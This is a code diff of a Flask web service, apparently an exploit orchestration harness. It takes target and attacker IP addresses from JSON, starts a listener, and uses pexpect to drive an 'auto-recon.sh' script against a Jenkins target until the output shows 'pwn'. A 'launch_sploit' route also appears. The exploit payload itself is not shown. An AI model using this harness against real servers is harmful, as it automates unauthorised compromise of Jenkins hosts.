@@ -42,12 +42,53 @@ def recon_run():
         print(request.accept_mimetypes)
         print(payload)
         print(type(payload))
-        target_ip = payload.get('target', '') 
-        exe = '/root/recon-command-run.sh'
-        child = pexpect.spawn('/root/recon-command-run.sh')
+        target_ip = payload.get('target', '')
+        attacker_ip = payload.get('attacker', '')
+        if target_ip == "" or attacker_ip == "":
+            print('Payload is all wrong!')
+            print(request.payload)
+            return 'ERROR'
+
+        exe = '/root/auto-recon.sh'
+        if not os.path.exists(exe):
+            return 500, 'launch script does not exist'
+
+        print('Launching auto-recon.sh')
+        child = pexpect.spawn('/root/auto-recon.sh')
         child.delaybeforesend = 2
         found_index = child.expect(['press any key to continue', pexpect.EOF, pexpect.TIMEOUT])
-    return 'SUCCESS - Recon launched!'
+        if found_index == 0:
+            print('launching listener process')
+            _launch_listener()
+            child.send('\n')
+        else:
+            return 'ERROR - Could not press key to continue'
+
+        found_index = child.expect(['Enter Attacker IP Address', pexpect.EOF, pexpect.TIMEOUT])
+        if found_index == 0:
+            print('Sending attacker ip :::' + attacker_ip + ':::')
+            child.sendline(attacker_ip)
+        else:
+            return 'ERROR - Could not enter attacker IP'
+
+        found_index = child.expect(['Enter Jenkins Target IP Address', pexpect.EOF, pexpect.TIMEOUT])
+        if found_index == 0:
+            print(child.before)
+            print('Sending target ip')
+            child.sendline(target_ip)
+        else:
+            print(child.before)
+            return 'ERROR - Could not enter jenkins IP'
+
+        found_index = child.expect(['pwn', pexpect.EOF, pexpect.TIMEOUT])
+        if found_index == 0:
+            print('PWN')
+            print(child)
+            time.sleep(2)
+            return 'SUCCESS - auto-recon launched!'
+
+    else:
+        return 'No Bueno - No JSON payload detected'
 
 @app.route("/launch", methods=['POST'])
 def launch_sploit():
@@ -187,5 +228,3 @@ def _launch_listener():
                 return False
             app.config['listener'] = listener
             return True
-
-
